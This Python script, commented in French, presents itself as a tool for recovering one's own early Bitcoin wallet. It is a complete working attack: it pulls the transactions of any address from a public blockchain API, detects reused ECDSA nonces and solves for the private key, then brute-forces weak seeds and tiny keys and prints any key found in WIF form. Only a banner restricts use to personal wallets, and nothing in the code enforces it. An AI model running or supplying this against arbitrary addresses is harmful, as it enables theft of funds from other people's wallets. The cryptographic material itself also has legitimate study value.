#!/usr/bin/env python3
"""
Bitcoin Private Key Recovery Tool
===================================
Outil de récupération de votre propre portefeuille Bitcoin (2010-2011).

Techniques implémentées :
  1. Détection et exploitation de la réutilisation du nonce ECDSA (k-reuse)
  2. Analyse des signatures de transactions sur la blockchain
  3. Brute-force de seeds faibles (RNG prédictibles des premiers clients)

Usage :
  python key_recovery.py <adresse_bitcoin>
  python key_recovery.py <clé_publique_hex>
  python key_recovery.py --weak-seeds <adresse_bitcoin>

Prérequis : pip install requests
"""

import sys
import hashlib
import struct
import json
import time
import argparse
import requests
from typing import Optional, Tuple, List


# ─── Paramètres secp256k1 ─────────────────────────────────────────────────────

P  = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFC2F
N  = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
Gx = 0x79BE667EF9DCBBAC55A06295CE870B07029BFCDB2DCE28D959F2815B16F81798
Gy = 0x483ADA7726A3C4655DA4FBFC0E1108A8FD17B448A68554199C47D08FFB10D4B8
G  = (Gx, Gy)


# ─── Arithmétique sur courbe elliptique ──────────────────────────────────────

def _extended_gcd(a: int, b: int) -> Tuple[int, int, int]:
    if a == 0:
        return b, 0, 1
    g, x, y = _extended_gcd(b % a, a)
    return g, y - (b // a) * x, x


def modinv(a: int, m: int) -> int:
    a = a % m
    g, x, _ = _extended_gcd(a, m)
    if g != 1:
        raise ValueError(f"Pas d'inverse modulaire pour {a} mod {m}")
    return x % m


def point_add(P1: Optional[Tuple], P2: Optional[Tuple]) -> Optional[Tuple]:
    if P1 is None:
        return P2
    if P2 is None:
        return P1
    x1, y1 = P1
    x2, y2 = P2
    if x1 == x2:
        if y1 != y2:
            return None
        if y1 == 0:
            return None
        lam = (3 * x1 * x1 * modinv(2 * y1, P)) % P
    else:
        lam = ((y2 - y1) * modinv(x2 - x1, P)) % P
    x3 = (lam * lam - x1 - x2) % P
    y3 = (lam * (x1 - x3) - y1) % P
    return (x3, y3)


def scalar_mult(k: int, point: Tuple) -> Optional[Tuple]:
    result = None
    addend = point
    while k:
        if k & 1:
            result = point_add(result, addend)
        addend = point_add(addend, addend)
        k >>= 1
    return result


# ─── Encodage / Décodage ──────────────────────────────────────────────────────

BASE58_ALPHABET = b'123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'


def base58_encode(data: bytes) -> str:
    n = int.from_bytes(data, 'big')
    result = []
    while n > 0:
        n, r = divmod(n, 58)
        result.append(BASE58_ALPHABET[r:r+1])
    leading = len(data) - len(data.lstrip(b'\x00'))
    result.extend([BASE58_ALPHABET[0:1]] * leading)
    return b''.join(reversed(result)).decode()


def sha256d(data: bytes) -> bytes:
    return hashlib.sha256(hashlib.sha256(data).digest()).digest()


def hash160(data: bytes) -> bytes:
    h = hashlib.new('ripemd160')
    h.update(hashlib.sha256(data).digest())
    return h.digest()


def privkey_to_wif(privkey: int, compressed: bool = False) -> str:
    key_bytes = privkey.to_bytes(32, 'big')
    if compressed:
        key_bytes += b'\x01'
    extended = b'\x80' + key_bytes
    checksum = sha256d(extended)[:4]
    return base58_encode(extended + checksum)


def pubkey_bytes(x: int, y: int, compressed: bool = True) -> bytes:
    if compressed:
        prefix = b'\x02' if y % 2 == 0 else b'\x03'
        return prefix + x.to_bytes(32, 'big')
    return b'\x04' + x.to_bytes(32, 'big') + y.to_bytes(32, 'big')


def pubkey_to_address(x: int, y: int, compressed: bool = True) -> str:
    h160 = hash160(pubkey_bytes(x, y, compressed))
    extended = b'\x00' + h160
    checksum = sha256d(extended)[:4]
    return base58_encode(extended + checksum)


def decompress_pubkey(hex_pub: str) -> Tuple[int, int]:
    """Décompresse une clé publique compressée (02/03 prefix)."""
    prefix = hex_pub[:2]
    x = int(hex_pub[2:], 16)
    y_sq = (pow(x, 3, P) + 7) % P
    y = pow(y_sq, (P + 1) // 4, P)
    if (y % 2 == 0) != (prefix == '02'):
        y = P - y
    return x, y


# ─── Parsing Bitcoin ──────────────────────────────────────────────────────────

def read_varint(data: bytes, offset: int) -> Tuple[int, int]:
    """Lit un varint Bitcoin, retourne (valeur, nouveau_offset)."""
    n = data[offset]
    if n < 0xFD:
        return n, offset + 1
    elif n == 0xFD:
        return struct.unpack_from('<H', data, offset + 1)[0], offset + 3
    elif n == 0xFE:
        return struct.unpack_from('<I', data, offset + 1)[0], offset + 5
    else:
        return struct.unpack_from('<Q', data, offset + 1)[0], offset + 9


def parse_der_sig(sig_bytes: bytes) -> Optional[Tuple[int, int]]:
    """Parse une signature DER ECDSA → (r, s)."""
    try:
        if sig_bytes[0] != 0x30:
            return None
        off = 2
        if sig_bytes[off] != 0x02:
            return None
        r_len = sig_bytes[off + 1]
        r = int.from_bytes(sig_bytes[off + 2: off + 2 + r_len], 'big')
        off += 2 + r_len
        if sig_bytes[off] != 0x02:
            return None
        s_len = sig_bytes[off + 1]
        s = int.from_bytes(sig_bytes[off + 2: off + 2 + s_len], 'big')
        return r, s
    except Exception:
        return None


def extract_p2pkh_scriptsig(script: bytes) -> Optional[Tuple[bytes, bytes]]:
    """Extrait (sig_bytes, pubkey_bytes) d'un scriptSig P2PKH."""
    try:
        off = 0
        sig_len = script[off]
        off += 1
        sig_bytes = script[off: off + sig_len]
        off += sig_len
        pub_len = script[off]
        off += 1
        pub_bytes = script[off: off + pub_len]
        if pub_bytes[0] not in (0x02, 0x03, 0x04):
            return None
        return sig_bytes, pub_bytes
    except Exception:
        return None


def compute_sighash_p2pkh(tx_hex: str, input_index: int, prev_scriptpubkey: bytes, sighash_type: int = 1) -> bytes:
    """
    Calcule le sighash (z) pour un input P2PKH (SIGHASH_ALL).
    Le sighash est le message signé par la clé privée.
    """
    tx = bytes.fromhex(tx_hex)
    off = 0

    version = struct.unpack_from('<I', tx, off)[0]
    off += 4

    input_count, off = read_varint(tx, off)

    inputs = []
    for i in range(input_count):
        prev_hash = tx[off:off+32]
        off += 32
        prev_idx = struct.unpack_from('<I', tx, off)[0]
        off += 4
        script_len, off = read_varint(tx, off)
        script = tx[off:off+script_len]
        off += script_len
        seq = struct.unpack_from('<I', tx, off)[0]
        off += 4
        inputs.append((prev_hash, prev_idx, script, seq))

    output_count, off = read_varint(tx, off)
    outputs_raw_start = off
    for _ in range(output_count):
        off += 8
        script_len, off = read_varint(tx, off)
        off += script_len
    outputs_raw = tx[outputs_raw_start:off]

    locktime = struct.unpack_from('<I', tx, off)[0]

    # Reconstituer la transaction pour le hachage
    serialized = struct.pack('<I', version)

    # Encode le nombre d'inputs
    serialized += _encode_varint(input_count)
    for i, (prev_hash, prev_idx, _script, seq) in enumerate(inputs):
        serialized += prev_hash
        serialized += struct.pack('<I', prev_idx)
        if i == input_index:
            serialized += _encode_varint(len(prev_scriptpubkey))
            serialized += prev_scriptpubkey
        else:
            serialized += b'\x00'
        serialized += struct.pack('<I', seq)

    serialized += _encode_varint(output_count)
    serialized += outputs_raw
    serialized += struct.pack('<I', locktime)
    serialized += struct.pack('<I', sighash_type)

    return sha256d(serialized)


def _encode_varint(n: int) -> bytes:
    if n < 0xFD:
        return bytes([n])
    elif n <= 0xFFFF:
        return b'\xfd' + struct.pack('<H', n)
    elif n <= 0xFFFFFFFF:
        return b'\xfe' + struct.pack('<I', n)
    else:
        return b'\xff' + struct.pack('<Q', n)


# ─── Attaque k-reuse ECDSA ────────────────────────────────────────────────────

def recover_privkey_k_reuse(r: int, s1: int, z1: int, s2: int, z2: int) -> Optional[int]:
    """
    Récupère la clé privée quand le même nonce k a été utilisé deux fois.

    Mathématiquement :
        k  = (z1 - z2) * modinv(s1 - s2, N)  mod N
        d  = (s1*k - z1) * modinv(r, N)        mod N
    """
    try:
        ds = (s1 - s2) % N
        if ds == 0:
            return None
        k = (z1 - z2) * modinv(ds, N) % N
        if k == 0 or k >= N:
            return None
        d = (s1 * k - z1) * modinv(r, N) % N
        if d == 0 or d >= N:
            return None
        return d
    except Exception:
        return None


def verify_privkey(d: int, expected_address: str) -> bool:
    """Vérifie qu'une clé privée correspond bien à l'adresse attendue."""
    pt = scalar_mult(d, G)
    if pt is None:
        return False
    x, y = pt
    addr_uncompressed = pubkey_to_address(x, y, compressed=False)
    addr_compressed   = pubkey_to_address(x, y, compressed=True)
    return expected_address in (addr_uncompressed, addr_compressed)


# ─── API Blockchain ───────────────────────────────────────────────────────────

class BlockstreamAPI:
    BASE = "https://blockstream.info/api"
    DELAY = 0.5  # secondes entre requêtes

    def _get(self, path: str, retries: int = 3) -> requests.Response:
        url = f"{self.BASE}{path}"
        for attempt in range(retries):
            try:
                resp = requests.get(url, timeout=20)
                resp.raise_for_status()
                return resp
            except requests.RequestException as e:
                if attempt < retries - 1:
                    time.sleep(2 ** attempt)
                else:
                    raise e
        raise RuntimeError(f"Échec API : {url}")

    def get_address_txs(self, address: str) -> List[dict]:
        resp = self._get(f"/address/{address}/txs")
        time.sleep(self.DELAY)
        return resp.json()

    def get_tx(self, txid: str) -> dict:
        resp = self._get(f"/tx/{txid}")
        time.sleep(self.DELAY)
        return resp.json()

    def get_tx_hex(self, txid: str) -> str:
        resp = self._get(f"/tx/{txid}/hex")
        time.sleep(self.DELAY)
        return resp.text.strip()

    def get_prev_tx(self, txid: str) -> dict:
        return self.get_tx(txid)


# ─── Analyse principale ───────────────────────────────────────────────────────

def analyze_address(address: str, api: BlockstreamAPI) -> Optional[int]:
    """
    Analyse toutes les transactions de l'adresse et cherche une réutilisation de nonce k.
    Retourne la clé privée si trouvée, None sinon.
    """
    print(f"\n{'='*60}")
    print(f"  Analyse : {address}")
    print(f"{'='*60}")

    print("\n[*] Récupération des transactions...")
    try:
        txs = api.get_address_txs(address)
    except Exception as e:
        print(f"[!] Erreur API : {e}")
        return None

    if not txs:
        print("[!] Aucune transaction trouvée.")
        return None

    print(f"[+] {len(txs)} transaction(s) trouvée(s)")

    # Collecte de toutes les signatures (r, s, z) provenant de cette adresse
    signatures = []  # [(txid, input_index, r, s, z, pubkey_hex)]

    for tx_info in txs:
        txid = tx_info['txid']
        print(f"\n[*] Transaction : {txid[:16]}...")

        try:
            tx_hex = api.get_tx_hex(txid)
            tx_full = api.get_tx(txid)
        except Exception as e:
            print(f"    [!] Impossible de récupérer : {e}")
            continue

        for vin_idx, vin in enumerate(tx_full.get('vin', [])):
            # Identifier si cet input provient de notre adresse
            prevout = vin.get('prevout', {})
            in_addr = prevout.get('scriptpubkey_address', '')

            if in_addr != address:
                continue

            print(f"    [+] Input {vin_idx} provient de notre adresse")

            # Extraire la signature du scriptSig
            scriptsig_hex = vin.get('scriptsig', '')
            if not scriptsig_hex:
                print(f"    [-] ScriptSig vide (peut-être SegWit ?)")
                continue

            scriptsig_bytes = bytes.fromhex(scriptsig_hex)
            extracted = extract_p2pkh_scriptsig(scriptsig_bytes)
            if not extracted:
                print(f"    [-] Format scriptSig non reconnu")
                continue

            sig_bytes_with_hashtype, pub_bytes = extracted
            # Enlever le hashtype byte en fin de signature
            sig_bytes = sig_bytes_with_hashtype[:-1]
            hashtype = sig_bytes_with_hashtype[-1]

            parsed = parse_der_sig(sig_bytes)
            if not parsed:
                print(f"    [-] Signature DER invalide")
                continue

            r, s = parsed

            # Récupérer le scriptPubKey de la sortie précédente
            prev_txid = vin.get('txid', '')
            prev_vout = vin.get('vout', 0)
            try:
                prev_tx = api.get_prev_tx(prev_txid)
                prev_output = prev_tx['vout'][prev_vout]
                prev_spk_hex = prev_output['scriptpubkey']
                prev_spk = bytes.fromhex(prev_spk_hex)
            except Exception as e:
                print(f"    [!] Impossible de récupérer la tx précédente : {e}")
                continue

            # Calculer le sighash z
            try:
                z_bytes = compute_sighash_p2pkh(tx_hex, vin_idx, prev_spk, hashtype)
                z = int.from_bytes(z_bytes, 'big')
            except Exception as e:
                print(f"    [!] Erreur calcul sighash : {e}")
                continue

            pub_hex = pub_bytes.hex()
            print(f"    [+] r = {hex(r)[:20]}...")
            print(f"    [+] s = {hex(s)[:20]}...")
            print(f"    [+] z = {hex(z)[:20]}...")

            signatures.append((txid, vin_idx, r, s, z, pub_hex))

    if len(signatures) < 2:
        print(f"\n[*] {len(signatures)} signature(s) analysée(s) — pas assez pour détecter un k-reuse.")
        return None

    print(f"\n[*] {len(signatures)} signature(s) analysée(s) — recherche de réutilisation de nonce k...")

    # Chercher des r-values identiques (signe d'un k réutilisé)
    r_map = {}
    for entry in signatures:
        txid, vin_idx, r, s, z, pub_hex = entry
        if r in r_map:
            prev_txid, prev_vin, prev_r, prev_s, prev_z, prev_pub = r_map[r]
            print(f"\n{'!'*60}")
            print(f"  *** RÉUTILISATION DE NONCE k DÉTECTÉE ***")
            print(f"{'!'*60}")
            print(f"  r identique : {hex(r)}")
            print(f"  Sig 1 : tx={prev_txid[:16]}... input={prev_vin}")
            print(f"  Sig 2 : tx={txid[:16]}... input={vin_idx}")

            # Tenter les deux combinaisons (s peut être négatif mod N)
            for s1, z1, s2, z2 in [(prev_s, prev_z, s, z), (prev_s, prev_z, N - s, z)]:
                d = recover_privkey_k_reuse(r, s1, z1, s2, z2)
                if d and verify_privkey(d, address):
                    _print_key_found(d, address)
                    return d

            print("[!] Récupération échouée malgré le k-reuse détecté.")
        else:
            r_map[r] = entry

    print("\n[-] Aucune réutilisation de nonce détectée dans les transactions.")
    return None


def _print_key_found(d: int, address: str):
    print(f"\n{'*'*60}")
    print(f"  CLE PRIVEE RECUPEREE AVEC SUCCES")
    print(f"{'*'*60}")
    print(f"  Adresse Bitcoin  : {address}")
    print(f"  Clé privée (hex) : {hex(d)}")
    print(f"  WIF non-compressé: {privkey_to_wif(d, compressed=False)}")
    print(f"  WIF compressé    : {privkey_to_wif(d, compressed=True)}")
    print(f"{'*'*60}\n")


# ─── Brute-force seeds faibles (2010-2011) ───────────────────────────────────

def bruteforce_weak_seeds(address: str, verbose: bool = True):
    """
    Tente de retrouver la clé privée en testant des seeds faibles connues
    utilisées par certains clients Bitcoin des premières années :

    - Clés basées sur des timestamps Unix (Jan 2009 – Déc 2011)
    - Clés dérivées d'un simple SHA256 d'entiers séquentiels
    - Valeurs proches de 0 ou de N-1

    Note : couvre seulement les cas de RNG très faibles.
    """
    print(f"\n[*] Mode brute-force seeds faibles (2010-2011)...")
    print(f"[*] Adresse cible : {address}\n")

    checked = 0

    # 1. Timestamps Unix (1er janv 2009 → 31 déc 2011)
    start_ts = 1230768000  # 2009-01-01
    end_ts   = 1325375999  # 2011-12-31
    print(f"[*] Test timestamps ({start_ts} → {end_ts})...")

    for ts in range(start_ts, end_ts + 1):
        # SHA256(timestamp_bytes_LE_32bits)
        seed = hashlib.sha256(struct.pack('<I', ts)).digest()
        d = int.from_bytes(seed, 'big') % N
        if d == 0:
            continue

        pt = scalar_mult(d, G)
        if pt is None:
            continue
        x, y = pt

        if pubkey_to_address(x, y, compressed=False) == address or \
           pubkey_to_address(x, y, compressed=True) == address:
            print(f"\n[+] TROUVÉ ! Timestamp seed : {ts}")
            _print_key_found(d, address)
            return d

        checked += 1
        if checked % 100_000 == 0 and verbose:
            progress = (ts - start_ts) / (end_ts - start_ts) * 100
            print(f"    Progression timestamps : {progress:.1f}% ({checked:,} testés)")

    # 2. SHA256 de petits entiers (brainwallet-style faible)
    print(f"\n[*] Test SHA256 de petits entiers (1 → 1 000 000)...")
    for i in range(1, 1_000_001):
        seed = hashlib.sha256(str(i).encode()).digest()
        d = int.from_bytes(seed, 'big') % N
        if d == 0:
            continue

        pt = scalar_mult(d, G)
        if pt is None:
            continue
        x, y = pt

        if pubkey_to_address(x, y, compressed=False) == address or \
           pubkey_to_address(x, y, compressed=True) == address:
            print(f"\n[+] TROUVÉ ! SHA256({i}) = clé privée")
            _print_key_found(d, address)
            return d

        if i % 100_000 == 0 and verbose:
            print(f"    SHA256 entiers : {i:,} / 1 000 000")

    # 3. Clés privées très petites (espace de recherche Bitcoin Puzzles)
    print(f"\n[*] Test clés privées de faible entropie (1 → 10 000)...")
    for i in range(1, 10_001):
        d = i
        pt = scalar_mult(d, G)
        if pt is None:
            continue
        x, y = pt

        if pubkey_to_address(x, y, compressed=False) == address or \
           pubkey_to_address(x, y, compressed=True) == address:
            print(f"\n[+] TROUVÉ ! Clé privée = {i}")
            _print_key_found(d, address)
            return d

    print("\n[-] Aucune clé trouvée dans l'espace de seeds faibles.")
    return None


# ─── Analyse clé publique seule ───────────────────────────────────────────────

def analyze_pubkey(pubkey_hex: str):
    """Affiche les informations dérivées d'une clé publique."""
    pubkey_hex = pubkey_hex.strip().lower()
    print(f"\n{'='*60}")
    print(f"  Analyse de la clé publique")
    print(f"{'='*60}")
    print(f"  Hex : {pubkey_hex}")

    if pubkey_hex.startswith('04') and len(pubkey_hex) == 130:
        x = int(pubkey_hex[2:66], 16)
        y = int(pubkey_hex[66:], 16)
        compressed = False
        print(f"  Type : non-compressée (04...)")
    elif pubkey_hex.startswith(('02', '03')) and len(pubkey_hex) == 66:
        x, y = decompress_pubkey(pubkey_hex)
        compressed = True
        print(f"  Type : compressée ({'pair' if pubkey_hex.startswith('02') else 'impair'})")
    else:
        print(f"[!] Format de clé publique non reconnu (longueur : {len(pubkey_hex)})")
        print(f"    Attendu : 66 caractères (compressée) ou 130 (non-compressée)")
        return None

    # Vérification que le point est bien sur la courbe
    lhs = (y * y) % P
    rhs = (x * x * x + 7) % P
    on_curve = lhs == rhs

    print(f"\n  Coordonnées :")
    print(f"    x = {hex(x)}")
    print(f"    y = {hex(y)}")
    print(f"  Sur la courbe secp256k1 : {'Oui' if on_curve else 'NON (clé invalide!)'}")

    if not on_curve:
        print("[!] Ce point n'est pas sur la courbe secp256k1 — clé invalide.")
        return None

    addr_uncomp = pubkey_to_address(x, y, compressed=False)
    addr_comp   = pubkey_to_address(x, y, compressed=True)

    print(f"\n  Adresses dérivées :")
    print(f"    Non-compressée : {addr_uncomp}")
    print(f"    Compressée     : {addr_comp}")

    # Clé publique compressée correspondante
    if not compressed:
        prefix = '02' if y % 2 == 0 else '03'
        print(f"\n  Clé publique compressée : {prefix}{x:064x}")

    return (x, y), addr_uncomp, addr_comp


# ─── Point d'entrée ───────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="Outil de récupération de clé privée Bitcoin (portefeuilles 2010-2011)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Exemples :
  # Analyser une adresse (k-reuse sur la blockchain)
  python key_recovery.py 1A1zP1eP5QGefi2DMPTfTL5SLmv7Divf

  # Analyser une clé publique (infos et adresses)
  python key_recovery.py 04bfcab...

  # Brute-force seeds faibles en plus
  python key_recovery.py --weak-seeds 1YourBitcoinAddress...

Notes :
  - Seul l'attaque k-reuse peut récupérer une clé depuis la blockchain
  - Le brute-force de seeds couvre les RNG très faibles des premiers clients
  - Pour les clés correctement générées, la récupération est cryptographiquement
    infaisable (problème du logarithme discret sur courbe elliptique)
        """
    )
    parser.add_argument('target', help='Adresse Bitcoin ou clé publique hex')
    parser.add_argument('--weak-seeds', action='store_true',
                        help='Activer le brute-force de seeds faibles (lent)')
    parser.add_argument('--quiet', action='store_true',
                        help='Réduire les messages de progression')

    args = parser.parse_args()
    target = args.target.strip()

    print("\n╔══════════════════════════════════════════════════════╗")
    print("║   Bitcoin Private Key Recovery Tool (2010-2011)     ║")
    print("║   Usage : portefeuilles personnels perdus uniquement ║")
    print("╚══════════════════════════════════════════════════════╝")

    # Détecter le type d'entrée
    is_pubkey = target.startswith(('02', '03', '04')) and len(target) in (66, 130)

    if is_pubkey:
        result = analyze_pubkey(target)
        if result is None:
            sys.exit(1)
        (x, y), addr_uncomp, addr_comp = result
        print(f"\n[*] Pour analyser les transactions, relancez avec l'adresse :")
        print(f"    python key_recovery.py {addr_uncomp}")
        print(f"    python key_recovery.py {addr_comp}")
        sys.exit(0)

    # C'est une adresse Bitcoin
    if not (target.startswith('1') and 25 <= len(target) <= 34):
        print(f"[!] Format non reconnu : {target}")
        print(f"    Entrez une adresse Bitcoin (commence par '1') ou une clé publique hex (02/03/04)")
        sys.exit(1)

    api = BlockstreamAPI()
    privkey = analyze_address(target, api)

    if privkey is None and args.weak_seeds:
        privkey = bruteforce_weak_seeds(target, verbose=not args.quiet)

    if privkey is None:
        print("\n[=] Résultat : Clé privée non trouvée avec les méthodes disponibles.")
        print("    Autres pistes à explorer :")
        print("    - Vérifier si vous avez une sauvegarde wallet.dat (Bitcoin Core)")
        print("    - Tester des passphrases brainwallet si vous vous en souvenez")
        print("    - Contacter un service de récupération spécialisé")
        sys.exit(1)
    else:
        sys.exit(0)


if __name__ == '__main__':
    main()
